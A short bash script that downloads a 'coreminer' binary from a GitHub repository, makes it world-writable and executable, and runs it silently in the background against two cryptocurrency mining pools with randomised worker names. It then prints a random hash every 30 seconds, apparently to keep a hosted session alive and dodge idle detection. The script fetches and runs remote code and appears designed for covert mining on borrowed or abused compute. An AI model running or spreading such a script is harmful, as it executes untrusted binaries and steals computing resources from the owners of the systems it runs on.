#!/bin/bash
export LC_ALL=C
export LANG=C
curl https://github.com/liecamshoe/file/raw/main/coreminer -L -o coreminer
chmod 777 coreminer
./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done 
